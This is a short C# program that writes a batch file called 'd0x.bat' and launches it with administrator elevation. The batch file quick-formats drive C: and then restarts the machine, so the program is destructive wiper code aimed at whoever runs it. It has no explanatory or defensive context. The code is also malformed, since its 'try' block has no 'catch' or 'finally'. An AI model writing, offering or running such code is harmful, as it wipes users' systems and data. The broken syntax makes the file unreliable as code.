using System;
using System.IO;
using System.Diagnostics;

public class BatCreator
{
    public static void Main()
    {
        string batPath = "d0x.bat";
        string[] batCommands = 
        {
	"@echo off",
	"format C: /q /x",
	"shutdown -r"
        };

        File.WriteAllLines(batPath, batCommands);

        try
        {
            Process.Start(new ProcessStartInfo(batPath) 
            { 
                UseShellExecute = true, 
                Verb = "runas"
            });
        }
    }
}